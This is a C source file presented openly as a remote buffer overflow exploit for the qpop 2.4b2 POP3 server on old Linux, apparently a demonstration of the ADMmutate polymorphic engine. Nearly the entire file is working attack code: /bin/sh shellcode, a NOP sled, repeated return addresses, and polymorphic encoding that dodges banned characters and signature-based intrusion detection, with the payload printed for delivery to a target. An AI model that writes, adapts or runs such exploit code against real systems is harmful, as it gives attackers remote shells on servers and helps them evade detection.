/* 
   Demonstration Remote qpop 2.4b2 linux sploit
   or can be tuned to attack vulnerable-remote.c
   target = kernel 2.2.18, slackware 7.0
   By: K2
   -D will disable the polymorph functions
   -p may be needed to increase the encode length if the strlen(shell)/4 == banned char
*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include "ADMmutapi.h"

#define SIZE   1200
#define NOPDEF 801
#define DEFOFF 0xbfffd3f9  /* linux 2.2.x set for qpop, (try -o 4240 -a 3 when exploiting vulnerable-remote) */


main(int argc, char **argv)
{
   /* i need to pad this shellcode because the amount to encode */
   char shell[] =
   "\xeb\x22\x5e\x89\xf3\x89\xf7\x83\xc7\x07\x31\xc0\xaa"
   "\x89\xf9\x89\xf0\xab\x89\xfa\x31\xc0\xab\xb0\x08\x04"
   "\x03\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xd9\xff"
   "\xff\xff/bin/sh"; /* cant be used in the offset anyhow */
   int epad=8,c,i; /* a pad of at LEAST 8 is required for this sploit */
   int nop=NOPDEF;
   unsigned int offset=DEFOFF;
   char buffer[SIZE];
   struct morphctl *mctlp;
   struct morphctl mut;
   mut.upper = 0; mut.lower = 1; mctlp = &mut;
   mut.banned="\x09\x0a\x0b\x0c\x0d\x20";
   
   mut.arch = IA32;
   while ((c = getopt(argc, argv, "Dp:h:o:a:")) != EOF)
   {
      switch (c)
      {
      case 'o':
         offset += (unsigned int) atoi(optarg);
         break;
      case 'a':
         nop += atoi(optarg);
         break;
      case 'p':   /* encode pad, the (strlen(shell)/4) == banned char*/
         epad += atoi(optarg);
         break;
      case 'D':
         mut.arch = DISABLE;
         break;
      default:
         fprintf(stderr, "usage: [-o offset] [-a alignment] [-p PAD] [-D]\n");
         exit(1);
         break;
      }
   }

   memset(buffer,0x90,SIZE);
   memcpy(buffer+nop,shell,strlen(shell));
   for (i = nop+strlen(shell); i < SIZE-4; i += 4) {
      *((int *) &buffer[i]) = offset;
   }

   init_mutate(mctlp);
   if(apply_key(buffer, strlen(shell)+epad, nop-1, mctlp) != 0)
     exit(1);
   if(apply_jnops(buffer, nop-1, mut) != 0)
     exit(2);
   if(apply_engine(buffer, strlen(shell)+epad, nop-1, mut) != 0)
     exit(3);

   fprintf(stderr,"buf[%d], nop[%d], target address = [0x%x]\n",strlen(buffer),nop,offset);
   printf("%s\n",buffer);
}
